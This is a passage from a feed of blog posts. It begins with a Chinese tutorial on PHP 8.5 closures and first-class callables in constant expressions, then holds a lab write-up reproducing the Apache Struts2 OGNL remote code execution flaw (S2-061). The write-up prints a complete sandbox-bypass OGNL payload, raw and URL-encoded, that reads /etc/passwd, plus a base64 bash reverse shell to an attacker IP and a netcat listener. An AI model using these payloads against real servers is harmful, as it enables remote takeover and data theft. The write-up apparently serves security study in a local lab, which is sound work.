总结旧规则为：常量表达式被限制在实际上是\"不可变值\"的操作，闭包不包括在内——尽管闭包本质上是编译后的代码（操作码），在约束下可以被视为不可变。</p>\n<p>为什么这很重要？</p>\n<p>因为这些上下文是你想放配置的地方：</p>\n<ul>\n<li>属性是你的元数据/配置层。</li>\n<li>默认参数/属性值表达预期行为，不需要样板代码。</li>\n<li>常量表达\"这个映射不会变\"。</li>\n</ul>\n<p>换句话说：常量表达式是 PHP 引导你走向声明式代码的地方。PHP 8.5 扩展了\"声明式\"的含义。</p>\n<h2 id=\"常量中的闭包安全可读的模式和硬性规则\">常量中的闭包：安全可读的模式（和硬性规则）</h2>\n<p>PHP 8.5 允许常量表达式中的闭包——但有严格约束：</p>\n<ul>\n<li>必须是静态的（没有 <code>$this</code>）。</li>\n<li>不能通过 <code>use(...)</code> 捕获外部变量。</li>\n<li>箭头函数在常量表达式中不支持，因为它们隐式捕获变量。</li>\n</ul>\n<p>这些规则是编译时强制的。</p>\n<p>这听起来有限制，但实际上这正是这个特性安全的原因：它防止意外把\"运行时状态\"偷渡进常量。</p>\n<h3 id=\"默认回调参数不需要可空样板\">默认回调参数，不需要可空样板</h3>\n<p>这是之前过滤器示例的干净 PHP 8.5 版本：</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfunction my_filter(\n    array $items,\n    Closure $predicate = static function ($v): bool { return !empty($v); },\n): array {\n    $out = [];\n    foreach ($items as $item) {\n        if ($predicate($item)) {\n            $out[] = $item;\n        }\n    }\n    return $out;\n}\n</code></pre>\n<p>这正是闭包 RFC 强调的动机：你可以声明一个真正的默认回调，不需要\"可空 + 运行时默认\"。</p>\n<p>实际上，这也改善了工具支持：</p>\n<ul>\n<li>参数正确地类型化为 <code>Closure</code>，不是 <code>?Closure</code></li>\n<li>调用者不需要猜测 <code>null</code> 是否有特殊含义</li>\n<li>你去掉了一个分支和一行初始化噪音</li>\n</ul>\n<h3 id=\"包含可调用行为的类常量\">包含可调用行为的类常量</h3>\n<p>你可以在常量或类常量中存储闭包，把它们当作\"可调用配置\"。</p>\n<p>一个简单例子：格式化器注册表。</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfinal class Formatters\n{\n    public const MAP = [\n        'trim_lower' =&gt; static function (string $s): string {\n            return strtolower(trim($s));\n        },\n        'digits_only' =&gt; static function (string $s): string {\n            return preg_replace('/\\D+/', '', $s) ?? '';\n        },\n    ];\n}\n</code></pre>\n<p>使用：</p>\n<pre><code class=\"language-php\">$input = \"  +62 (812) 345-678  \";\n$normalized = (Formatters::MAP['digits_only'])($input);\n</code></pre>\n<p>这读起来像配置，但不是\"字符串类型\"。它是真正的 PHP，编译过的，有类型的，可重构的。</p>\n<h3 id=\"属性默认值可调用行为作为默认策略\">属性默认值：可调用行为作为默认策略</h3>\n<p>因为常量表达式中的闭包可以用作属性默认值，你可以在属性声明处定义默认策略——同样不需要运行时初始化。</p>\n<p>例子：可配置的规范化器。</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfinal class Normalizer\n{\n    public Closure $normalize = static function (string $s): string {\n        return trim($s);\n    };\n\n    public function run(string $value): string\n    {\n        return ($this-&gt;normalize)($value);\n    }\n}\n</code></pre>\n<p><strong>重要细节</strong>：常量表达式中的闭包必须是静态的，这意味着闭包本身不能用 <code>$this</code>。</p>\n<p>这是故意的权衡：常量表达式只求值一次，而 <code>$this</code> 只有在闭包为每个对象实例重新创建时才有意义（这不是常量表达式的行为方式）。</p>\n<h3 id=\"作用域闭包在正确的上下文中仍然能看到私有成员\">作用域：闭包在正确的上下文中仍然能看到私有成员</h3>\n<p>尽管闭包必须是静态的（没有 <code>$this</code>），在这些常量上下文中创建的闭包仍然遵循正常的作用域规则。RFC 说明：</p>\n<ul>\n<li>属性默认值中的闭包可以访问所在类的私有属性/方法/常量</li>\n<li>属性参数中的闭包可以访问所在类的私有成员</li>\n</ul>\n<p>这启用了一个好模式：把复杂逻辑放在私有静态辅助方法中，把闭包作为配置暴露出来。</p>\n<h2 id=\"常量中的一等可调用对象重构安全的引用不用字符串\">常量中的一等可调用对象：重构安全的引用，不用字符串</h2>\n<p>闭包适合\"内联逻辑\"。但有时候你不想要内联逻辑——你想指向一个现有的函数或静态方法。</p>\n<p>这就是一等可调用对象（FCC）的用武之地。</p>\n<p>一等可调用对象看起来像：</p>\n<pre><code class=\"language-php\">strrev(...)\nMyClass::myMethod(...)\n</code></pre>\n<p>它们产生一个转发到函数/方法的 <code>Closure</code>。</p>\n<p>PHP 8.5 现在允许常量表达式中的 FCC 语法，旨在\"完善\"常量中闭包的特性。</p>\n<h3 id=\"为什么-fcc-比字符串可调用更好\">为什么 FCC 比字符串可调用更好</h3>\n<p>比较这两个：</p>\n<pre><code class=\"language-php\">// 旧方式\npublic const HANDLERS = [\n    'reverse' =&gt; 'strrev',\n    'slug' =&gt; 'App\\\\Slugger::slugify',\n];\n</code></pre>\n<p>对比：</p>\n<pre><code class=\"language-php\">// PHP 8.5\npublic const HANDLERS = [\n    'reverse' =&gt; strrev(...),\n    'slug' =&gt; Slugger::slugify(...),\n];\n</code></pre>\n<p>第二个版本更好，因为：</p>\n<ul>\n<li>可重构：重命名和移动更可靠</li>\n<li>静态分析可以理解它是可调用的</li>\n<li>你避免了魔术字符串和运行时可调用解析</li>\n</ul>\n<h3 id=\"常量表达式中-fcc-的约束\">常量表达式中 FCC 的约束</h3>\n<p>FCC RFC 添加了一些重要限制（除了正常的 FCC 规则）：</p>\n<ul>\n<li>只支持独立函数和静态方法（<code>::</code>）。</li>\n<li>只支持 <code>function_name(...)</code> 和 <code>ClassName::methodName(...)</code> 语法。</li>\n<li>你不能用表达式构建名称（<code>($fn)(...)</code>）、数组（<code>[ClassName::class, 'method'](...)</code>），或依赖 <code>__callStatic()</code> 魔术方法。</li>\n</ul>\n<p>这是好事：它让常量表达式中的 FCC 用法清晰且可分析。</p>\n<h2 id=\"实际用例\">实际用例</h2>\n<h3 id=\"用例路由映射作为常量\">用例：路由映射作为常量</h3>\n<p>传统方式，路由映射是运行时构建的：</p>\n<pre><code class=\"language-php\">$routes = [\n    'GET /health' =&gt; [HealthController::class, 'check'],\n    'GET /posts'  =&gt; [PostsController::class, 'index'],\n];\n</code></pre>\n<p>这能用，但不是重构安全的。</p>\n<p>在 PHP 8.5 中你可以用 FCC 或静态闭包定义路由映射，作为常量：</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfinal class Routes\n{\n    public const MAP = [\n        'GET /health' =&gt; HealthController::check(...),\n        'GET /posts'  =&gt; PostsController::index(...),\n        // 快速端点的内联处理器\n        'GET /version' =&gt; static function (Request $req): Response {\n            return Response::text('ok');\n        },\n    ];\n}\n</code></pre>\n<p>现在你可以实现一个简单的分发器：</p>\n<pre><code class=\"language-php\">final class Dispatcher\n{\n    public function dispatch(Request $req): Response\n    {\n        $key = $req-&gt;method . ' ' . $req-&gt;path;\n        $handler = Routes::MAP[$key] ?? null;\n        if ($handler === null) {\n            return Response::text('Not found', 404);\n        }\n        return $handler($req);\n    }\n}\n</code></pre>\n<p>这个模式有几个好处：</p>\n<ul>\n<li>路由映射是真正的常量配置。</li>\n<li>处理器是真正的可调用对象，不是字符串。</li>\n<li>重构更安全（特别是静态方法处理器）。</li>\n</ul>\n<p>实际的路由器需要路径参数；但即使这样，\"处理器注册表\"部分通常保持静态。</p>\n<h3 id=\"用例消息总线的处理器注册表\">用例：消息总线的处理器注册表</h3>\n<p>想象一个简单的消息总线：消息类映射到处理器。</p>\n<p>旧方式：</p>\n<pre><code class=\"language-php\">$handlers = [\n    UserRegistered::class =&gt; 'App\\\\Handlers\\\\SendWelcomeEmail::handle',\n];\n</code></pre>\n<p>现在，用 PHP 8.5 FCC：</p>\n<pre><code class=\"language-php\">final class MessageHandlers\n{\n    public const MAP = [\n        UserRegistered::class =&gt; SendWelcomeEmail::handle(...),\n        OrderPaid::class      =&gt; CreateInvoice::handle(...),\n    ];\n}\n</code></pre>\n<p>分发器：</p>\n<pre><code class=\"language-php\">final class Bus\n{\n    public function __construct(private Container $container) {}\n\n    public function handle(object $message): void\n    {\n        $handler = MessageHandlers::MAP[$message::class] ?? null;\n        if ($handler === null) {\n            throw new RuntimeException('No handler registered for ' . $message::class);\n        }\n        // 如果处理器是静态的，它们可以显式接受依赖，\n        // 或者你可以调整这个模式（见下面的 DI 说明）。\n        $handler($message, $this-&gt;container);\n    }\n}\n</code></pre>\n<p>关键概念：常量表达式让你把映射保持在常量中，但你仍然控制依赖如何注入——通过签名设计。</p>\n<h3 id=\"用例策略格式化器注册表switch-语句的干净替代\">用例：策略/格式化器注册表（switch 语句的干净替代）</h3>\n<p>这是我最喜欢的实际用途：替换一个不断增长的 switch。</p>\n<pre><code class=\"language-php\">function format(string $type, mixed $value): string\n{\n    return match ($type) {\n        'json' =&gt; json_encode($value),\n        'text' =&gt; (string) $value,\n        'upper' =&gt; strtoupper((string) $value),\n        default =&gt; throw new InvalidArgumentException('Unknown formatter'),\n    };\n}\n</code></pre>\n<p>现在想象这增长到 15-30 个策略。你最终得到一个大 match 和一个 diff 磁铁。</p>\n<p>用可调用常量：</p>\n<pre><code class=\"language-php\">final class FormatterRegistry\n{\n    public const FORMATTERS = [\n        'json' =&gt; static function (mixed $v): string {\n            return json_encode($v, JSON_THROW_ON_ERROR);\n        },\n        'text' =&gt; static function (mixed $v): string {\n            return (string) $v;\n        },\n        // FCC 到原生函数\n        'reverse' =&gt; strrev(...),\n    ];\n\n    public static function format(string $type, mixed $value): string\n    {\n        $fn = self::FORMATTERS[$type] ?? null;\n        if ($fn === null) {\n            throw new InvalidArgumentException(\"Unknown formatter: {$type}\");\n        }\n        return $fn($value);\n    }\n}\n</code></pre>\n<p>现在添加策略只需要改一行。</p>\n<h2 id=\"测试和依赖注入什么该放常量什么该放容器\">测试和依赖注入：什么该放常量，什么该放容器</h2>\n<p>这个特性引导你走向\"代码即配置\"。这很好——直到你开始把运行时状态注入到应该是静态的东西里。</p>\n<p>一个好的心智模型：</p>\n<ul>\n<li><strong>常量应该包含稳定的接线</strong>：映射、策略、不依赖运行时状态的小逻辑片段。</li>\n<li><strong>DI 容器应该包含运行时组装</strong>：需要环境相关接线的对象、IO 资源、凭证、连接等。</li>\n</ul>\n<h3 id=\"好的常量可调用用法纯粹的转换和策略\">好的常量可调用用法：纯粹的转换和策略</h3>\n<p>这些在常量表达式中是安全的：</p>\n<ul>\n<li>规范化函数（trim、canonicalize）</li>\n<li>路由/分发选择逻辑</li>\n<li>只依赖输入值的验证器</li>\n<li>格式化器和映射器</li>\n</ul>\n<h3 id=\"di-的用武之地当你需要依赖时\">DI 的用武之地：当你需要依赖时</h3>\n<p>你仍然可以通过设计可调用对象显式接受依赖来混合可调用配置和 DI。</p>\n<p>例子：注册表返回一个接受 <code>(Message $m, Container $c)</code> 的可调用对象：</p>\n<pre><code class=\"language-php\">final class Handlers\n{\n    public const MAP = [\n        UserRegistered::class =&gt; static function (UserRegistered $m, Container $c): void {\n            $mailer = $c-&gt;get(Mailer::class);\n            $mailer-&gt;sendWelcome($m-&gt;email);\n        },\n    ];\n}\n</code></pre>\n<p>这保持在约束内，因为闭包是静态的且不捕获状态。\"依赖解析\"在调用时发生，容器被传入。</p>\n<p>这总是理想的吗？不是。但它是一个干净、显式的桥梁。</p>\n<h3 id=\"测试影响更好的默认值更容易覆盖\">测试影响：更好的默认值，更容易覆盖</h3>\n<p>常量表达式闭包让默认值更干净：</p>\n<ul>\n<li>函数可以有默认闭包参数（不用可空）。</li>\n<li>属性可以有默认闭包策略。</li>\n</ul>\n<p>对于测试，你仍然可以通过传递不同的闭包参数或给对象属性赋值不同的策略来覆盖行为（如果该属性设计上是可变的）。主要改进是默认行为在它该在的地方表达，你不需要运行时初始化胶水代码来创建默认闭包。</p>\n<h2 id=\"陷阱捕获状态副作用和团队可读性\">陷阱：捕获状态、副作用和团队可读性</h2>\n<p>这个特性给你在\"配置上下文\"中更多能力。能力带来新的搬起石头砸自己脚的方式。</p>\n<h3 id=\"陷阱-a试图捕获状态不会编译这是好事\">陷阱 A：试图捕获状态（不会编译——这是好事）</h3>\n<p>你不能这样做：</p>\n<pre><code class=\"language-php\">$prefix = \"prod_\";\nconst FN = static function (string $s) use ($prefix): string {\n    return $prefix . $s;\n};\n</code></pre>\n<p>常量表达式中的闭包不能通过 <code>use(...)</code> 捕获变量。</p>\n<p>这是硬性约束，它强迫你采用更好的设计：</p>\n<ul>\n<li>把值作为参数传递</li>\n<li>使用常量/类常量</li>\n<li>或者做运行时配置，而不是假装它是常量</li>\n</ul>\n<p>类似地，箭头函数在常量表达式中被阻止，因为它们隐式捕获变量。</p>\n<h3 id=\"陷阱-b在配置里隐藏副作用\">陷阱 B：在\"配置\"里隐藏副作用</h3>\n<p>如果你的\"注册表\"闭包开始做 IO、访问数据库、读取环境变量等，你就让配置变得不可预测了。</p>\n<p>一个好规则：</p>\n<p>如果可调用对象做的不只是\"计算并返回\"，考虑把它移到真正的服务中，通过静态方法引用它（或容器接线）。</p>\n<h3 id=\"陷阱-c在纯数据更清晰的地方用可调用配置\">陷阱 C：在纯数据更清晰的地方用可调用配置</h3>\n<p>仅仅因为你能在属性里放代码，不意味着你应该这样做。</p>\n<p>如果你的规则可以表达为简单数据——用数据。例子：</p>\n<ul>\n<li>允许的角色</li>\n<li>数字范围</li>\n<li>枚举集合</li>\n</ul>\n<p>可调用配置应该是你的工具，用于数据本身变得笨拙的情况（或者你否则会发明一个字符串表达式 DSL）。</p>\n<h3 id=\"陷阱-d团队间的可读性和一致性\">陷阱 D：团队间的可读性和一致性</h3>\n<p>可调用配置仍然是代码。如果你的团队经验水平不一，你需要约定：</p>\n<ul>\n<li>保持常量表达式闭包简短。</li>\n<li>当闭包超过约 10 行时，倾向于命名逻辑并通过 FCC 引用它（<code>SomeClass::somePolicy(...)</code>）。</li>\n<li>避免花哨写法（特别是嵌套匿名函数）。</li>\n</ul>\n<h2 id=\"指南什么时候配置应该保持数据什么时候可调用配置是合理的\">指南：什么时候配置应该保持\"数据\"，什么时候\"可调用配置\"是合理的</h2>\n<p>这是一套在实际代码库中通常效果不错的实用指南。</p>\n<p><strong>在以下情况倾向于纯数据配置：</strong></p>\n<ul>\n<li>规则是静态且小的（标志、列表、阈值）</li>\n<li>你想要容易序列化（比如导出配置）</li>\n<li>你想让非开发者可以编辑配置（在某些组织中）</li>\n</ul>\n<p>例子：</p>\n<pre><code class=\"language-php\">final class Limits\n{\n    public const MAX_TITLE_LENGTH = 120;\n    public const ALLOWED_SORTS = ['newest', 'popular', 'discussed'];\n}\n</code></pre>\n<p><strong>在以下情况使用可调用配置：</strong></p>\n<ul>\n<li>规则简单但不能很好地映射到数据（比如谓词）</li>\n<li>使用数据会把你推向自定义 DSL</li>\n<li>你想通过属性让配置靠近类/方法</li>\n<li>你想要重构安全的可调用对象而不是字符串</li>\n</ul>\n<p>这正是 PHP 8.5 在属性、默认值和常量中启用的。</p>\n<p><strong>保持可调用配置安全且可维护：</strong></p>\n<ul>\n<li>让闭包静态（反正是必须的）。</li>\n<li>不要试图捕获外部变量（<code>use(...)</code> 不允许）。</li>\n<li>当逻辑增长时：把它移到命名的静态方法并用 FCC 引用它，PHP 8.5 现在在常量表达式中允许这样做。</li>\n<li>只在支持的形式中使用 FCC：<code>function_name(...)</code> 和 <code>ClassName::methodName(...)</code>（不支持数组可调用语法）。</li>\n</ul>\n<h3 id=\"关于性能和-opcache-的说明\">关于性能和 opcache 的说明</h3>\n<p>如果你想知道这是否\"免费\"，两个 RFC 都提到 opcache 需要调整才能正确地在共享内存中存储这些闭包/可调用对象。</p>\n<p>换句话说：这个特性的实现考虑了真实世界的运行时环境（opcache/JIT）。目标不是微优化——而是表达力和安全性。</p>\n<h2 id=\"小结\">小结</h2>\n<p>PHP 8.5 支持常量表达式中的静态闭包和一等可调用对象，这是那种在更新日志上看起来很小、然后悄悄改善你设计 API 方式的特性：</p>\n<ul>\n<li>默认回调变得干净且类型正确（不用可空样板）。</li>\n<li>属性可以携带真正的可执行策略逻辑——不用字符串 DSL。</li>\n<li>注册表和路由映射可以定义为常量，使用重构安全的可调用对象。</li>\n</ul>\n<p>约束就是护栏：不能捕获变量、没有 <code>$this</code>、常量表达式中没有箭头函数。</p>\n<p>如果你接受这些护栏，你会得到一个真正更好的\"编译时风格\"配置层——接线是静态的、可读的、重构更安全。</p>\n<p>用它来移除胶水代码，而不是隐藏复杂性。保持可调用配置简短，给重的东西命名，让你的常量描述\"发生什么\"，而不是把它们变成迷你应用程序。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-17 08:09</span>&nbsp;\n<a href=\"https://www.cnblogs.com/catchadmin\">JaguarJack</a>&nbsp;\n阅读(<span id=\"post_view_count\">24</span>)&nbsp;\n评论(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Apache Struts2 OGNL RCE注入",
      "link": "https://www.cnblogs.com/hzhsec/p/19492577",
      "published": "",
      "description": "<h2>\n\t\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/hzhsec/p/19492577\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 16:02\">\n    <span>Apache Struts2 OGNL RCE注入</span>\n    \n\n</a>\n\n\t\t</h2>\n\t\t    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        Apache Struts2 OGNL RCE漏洞是一种严重的远程代码执行漏洞，攻击者通过构造恶意的OGNL表达式注入到HTTP请求参数中，利用Struts2框架对OGNL表达式处理不当的缺陷，绕过安全沙箱限制，最终实现在目标服务器上执行任意系统命令，从而获取服务器控制权。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"1什么是apache-struts2\">1.什么是Apache Struts2?</h2>\n<p>Apache Struts2（也称为 Struts2）是一个开源的 Java Web 应用框架。<br />\n它主要用于构建企业级 <code>Java EE Web</code> 应用程序，提供 <code>MVC</code>（<code>Model-View-Controller</code>）架构支持，帮助开发者快速开发可维护的 Web 应用。</p>\n<p>Struts2 基于 <code>OGNL</code>（<code>Object-Graph Navigation Language</code>）表达式语言来处理数据绑定、表单验证和动态内容渲染等功能。它是 <code>Struts1</code> 的后继版本，从 2006 年左右开始流行，但由于历史漏洞较多，现在许多项目已转向更现代的框架如 Spring MVC。</p>\n<h2 id=\"2原理\">2.原理</h2>\n<p>(1) <strong>OGNL</strong></p>\n<p><strong>OGNL三要素</strong></p>\n<ol>\n<li>\n<p><strong>Expression（表达式）</strong> 字符串形式的指令，告诉 OGNL “你要做什么”。 例子：<code>user.name</code>、<code>@java.lang.Runtime@getRuntime().exec('calc')</code>、<code>#session.get('user')</code> 等</p>\n</li>\n<li>\n<p><strong>Root（根对象）</strong> 操作的“主体对象”，也就是你主要想访问/修改的对象。 在 Struts2 中，<strong>Root 默认就是 ValueStack（值栈）</strong>，值栈最顶层通常是当前的 Action 实例。 → 访问 Root 对象的属性时，<strong>不需要加任何前缀</strong>，直接写属性名即可。</p>\n</li>\n<li>\n<p><strong>Context（上下文）</strong> 一个 Map 结构（OgnlContext），相当于“运行环境”。 里面存放了各种辅助对象、临时变量、环境信息等。 在 Struts2 中，<strong>Context 就是 ActionContext</strong>，包含了：</p>\n<ul>\n<li><code>#parameters</code>（请求参数）</li>\n<li><code>#request</code></li>\n<li><code>#session</code></li>\n<li><code>#application</code></li>\n<li><code>#attr</code>（依次查找 page→request→session→application）</li>\n<li>值栈本身（作为 Root）<br />\n→ 访问 Context 里的对象，必须加 <strong>#</strong> 前缀，例如 <code>#session.user</code>、<code>#parameters.name</code></li>\n</ul>\n</li>\n</ol>\n<p><strong>OGNL中的重要符号</strong></p>\n<p>有三个<code>#%$</code><br />\n<code>%</code></p>\n<pre><code>%: 其用途是在标志属性为字符串类型时，计算OGNL表达式的值，类似JS中的函数eval()。 \n例如:&lt;s:url value =“%{items.{title}[0]}”/&gt;。获取items对象中title属性，title为数组，取数组索引为0位置的值\n</code></pre>\n<p><code>#</code></p>\n<pre><code>访问 Context（非根对象）里的数据,取 session、request、parameters、application 等时使用\n例如:#session.user #parameters.username #request.get('key')\n</code></pre>\n<p><code>$</code></p>\n<pre><code>1. 在 struts.xml 配置文件里引用 OGNL\n2. 在国际化资源文件（.properties）里引用 OGNL\n例如:struts.xml 里： 资源文件：welcome=${user.name}\n</code></pre>\n<p>(2) <strong>OGNL RCE漏洞原理</strong></p>\n<p>OGNL RCE漏洞是 <code>Struts2</code> 中一类常见的严重安全问题，主要源于框架对 <code>OGNL</code> 表达式的处理不当。</p>\n<p><code>OGNL</code> 是一种强大的表达式语言，用于访问 Java 对象的属性和方法.但在 <code>Struts2</code> 中，如果用户输入（如 <code>HTTP</code> 请求头、参数或标签属性）被直接用于 <code>OGNL</code> 求值，而没有充分验证或转义，就会导致注入攻击。</p>\n<p><strong>漏洞影响范围</strong></p>\n<p>OGNL RCE 漏洞影响了 <code>Struts2</code> 的多个历史版本：</p>\n<ul>\n<li>常见受影响版本：从 <code>Struts 2.0.0</code> 到 <code>2.5.x </code>系列（如 <code>2.5.25</code> 之前），部分 6.x 早期版本有类似问题。但许多旧版本（如 2.3.x）已停止支持（EOL）。<br />\n不是所有 <code>Struts2</code> 应用都易受攻击，取决于配置（如是否使用强制 <code>OGNL</code> 求值或暴露了特定插件）。但遗留系统特别危险。</li>\n</ul>\n<h2 id=\"3漏洞复现\">3.漏洞复现</h2>\n<p>漏洞复现环境<br />\n准备好<code>docker</code></p>\n<ol>\n<li><strong>靶机环境</strong>（使用 vulhub靶场）：</li>\n</ol>\n<pre><code class=\"language-bash\">克隆vulhub仓库\ngit clone --depth 1 https://github.com/vulhub/vulhub.git\n到漏洞地址\ncd vulhub/struts2/s2-061\n</code></pre>\n<p>拉取镜像</p>\n<pre><code class=\"language-sh\">docker-compose up -d \n</code></pre>\n<p>拉取失败的可以使用这个仓库的镜像源配置工具:</p>\n<pre><code class=\"language-sh\">git clone https://github.com/hzhsec/docker_proxy.git\nchmod +x *.sh\n./docker-proxy.sh\n</code></pre>\n<p>再拉取</p>\n<pre><code class=\"language-sh\">docker-compose up -d \n</code></pre>\n<p>使用docker ps查看镜像是否运行</p>\n<p>访问：<a href=\"http://xn--IP-eo8d177o:8080\" rel=\"noopener nofollow\" target=\"_blank\">http://靶机IP:8080</a><br />\n<img alt=\"image.png\" class=\"lazyload\" /></p>\n<ul>\n<li>尝试id注入代码</li>\n</ul>\n<pre><code>http://192.168.41.128:8080/.action?id=%{'hzhsec'+(1+2).toString()}\nurl编码\nhttp://192.168.41.128:8080/.action?id=%25%7B'hzhsec'%2B(1%2B2).toString()%7D\n</code></pre>\n<p><img alt=\"image.png\" class=\"lazyload\" /><br />\n成功将id的值更换执行</p>\n<p>尝试poc</p>\n<pre><code>%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]). (#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]). (#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)). (#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")). (#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)). (#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"cat /etc/passwd\")). (#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}\n\n编码:\n%25%7B(%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D).%20(%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D).%20(%23bean%3D%23instancemanager.newInstance(%22org.apache.commons.collections.BeanMap%22)).(%23bean.setBean(%23stack)).%20(%23context%3D%23bean.get(%22context%22)).(%23bean.setBean(%23context)).(%23macc%3D%23bean.get(%22memberAccess%22)).%20(%23bean.setBean(%23macc)).(%23emptyset%3D%23instancemanager.newInstance(%22java.util.HashSet%22)).(%23bean.put(%22excludedClasses%22%2C%23emptyset)).(%23bean.put(%22excludedPackageNames%22%2C%23emptyset)).%20(%23arglist%3D%23instancemanager.newInstance(%22java.util.ArrayList%22)).(%23arglist.add(%22cat%20%2Fetc%2Fpasswd%22)).%20(%23execute%3D%23instancemanager.newInstance(%22freemarker.template.utility.Execute%22)).(%23execute.exec(%23arglist))%7D\n</code></pre>\n<p><img alt=\"image.png\" class=\"lazyload\" /><br />\n成功读取<code>/etc/passwd</code><br />\n<img alt=\"image.png\" class=\"lazyload\" /></p>\n<p>尝试修改命令反弹shell</p>\n<pre><code>shell命令\nbash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}\n替换上面的cat命令\n</code></pre>\n<p>攻击机:</p>\n<pre><code>nc -lvvp 4444 启动监听\n</code></pre>\n<p><img alt=\"image.png\" class=\"lazyload\" /><br />\n发送payload</p>\n<pre><code>http://192.168.41.128:8080/.action?id=%25%7B(%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D).%20(%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D).%20(%23bean%3D%23instancemanager.newInstance(%22org.apache.commons.collections.BeanMap%22)).(%23bean.setBean(%23stack)).%20(%23context%3D%23bean.get(%22context%22)).(%23bean.setBean(%23context)).(%23macc%3D%23bean.get(%22memberAccess%22)).%20(%23bean.setBean(%23macc)).(%23emptyset%3D%23instancemanager.newInstance(%22java.util.HashSet%22)).(%23bean.put(%22excludedClasses%22%2C%23emptyset)).(%23bean.put(%22excludedPackageNames%22%2C%23emptyset)).%20(%23arglist%3D%23instancemanager.newInstance(%22java.util.ArrayList%22)).(%23arglist.add(%22bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4yMTAuNjYuMTA4LzQ0NDQgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22)).%20(%23execute%3D%23instancemanager.newInstance(%22freemarker.template.utility.Execute%22)).(%23execute.exec(%23arglist))%7D\n</code></pre>\n<p>成功上线:<br />\n<img alt=\"image.png\" class=\"lazyload\" /></p>\n<h3 id=\"poc原理\">poc原理</h3>\n<ol>\n<li>\n<p><strong>获取 Tomcat 的 InstanceManager</strong> <code>#instancemanager</code> = <code>#application[\"org.apache.tomcat.InstanceManager\"]</code> → 从 <code>ServletContext</code>（application）里拿到<code> Tomcat</code> 的实例管理器，它能“暴力”new 出任何类的实例（即使 OGNL 沙箱不允许）。</p>\n</li>\n<li>\n<p><strong>拿到当前的 ValueStack（值栈）</strong> <code>#stack</code> = <code>#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]</code> → 值栈是 <code>Struts2</code> 的核心，里面存着 <code>Action</code>、<code>request</code>、<code>session</code> 等所有上下文信息。</p>\n</li>\n<li>\n<p><strong>用 <code>BeanMap</code> 魔法绕过访问限制</strong>（最核心的沙箱绕过技巧） <code>#bean</code> = <code>#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")</code> <code>#bean.setBean(#stack)</code> → 创建一个 <code>BeanMap</code>（一种能把任意对象当 Map 用的黑科技类），然后把值栈塞进去。 之后就能通过 <code>.get(\"context\")</code>、 <code>.get(\"memberAccess\")</code> 这种方式，访问原本不允许直接访问的私有字段。</p>\n</li>\n</ol>\n<p>继续链式操作： → 先拿到 <code>context</code> → 再拿到 <code>_memberAccess</code>（OGNL 的安全管理器对象，控制什么能执行、什么类被禁止）</p>\n<ol start=\"4\">\n<li>\n<p><strong>清空沙箱黑名单</strong>（真正解除限制） <code>#emptyset = #instancemanager.newInstance(\"java.util.HashSet\") </code> <code>#bean.put(\"excludedClasses\", #emptyset)</code> <code>#bean.put(\"excludedPackageNames\", #emptyset)</code> → 把 OGNL 的两个黑名单（禁止的类 + 禁止的包）全部清空成空集合。 → 从此 OGNL 什么类都能用了，什么包都能访问了（沙箱彻底失效）。</p>\n</li>\n<li>\n<p><strong>准备命令并执行</strong> <code>#arglist</code> = <code>#instancemanager.newInstance(\"java.util.ArrayList\")</code> <code>#arglist.add(\"cat /etc/passwd\")</code> → 创建一个参数列表，里面放要执行的命令。</p>\n</li>\n</ol>\n<p><code>#execute</code> = <code>#instancemanager.newInstance(\"freemarker.template.utility.Execute\") #execute.exec(#arglist)</code> → 用 Freemarker 自带的 Execute 工具类来执行系统命令（这个类本来不允许被 OGNL 调用，但现在沙箱没了，就能用了）。</p>\n<p>**总结： 这个payload 先用 Tomcat InstanceManager + BeanMap 魔法链 → 找到并修改 OGNL 的安全管理器 → 清空所有黑名单 → 最后用 Freemarker 的 Execute 类执行 cat /etc/passwd。</p>\n<h2 id=\"4漏洞防御\">4.<strong>漏洞防御</strong></h2>\n<p>1、升级到Struts 2的安全版本，比如<code>2.3.32</code>或<code>2.5.16</code>，这些版本包含了对应的安全修复<br />\n2、禁用OGNL表达式的执行，或者使用Struts 2的安全<code>mechansim</code>。</p>\n<p><strong>免责声明</strong><br />\n本文档所包含的漏洞复现方法、技术细节及利用代码，<strong>仅限用于授权的安全测试、教育学习与研究目的</strong>。<br 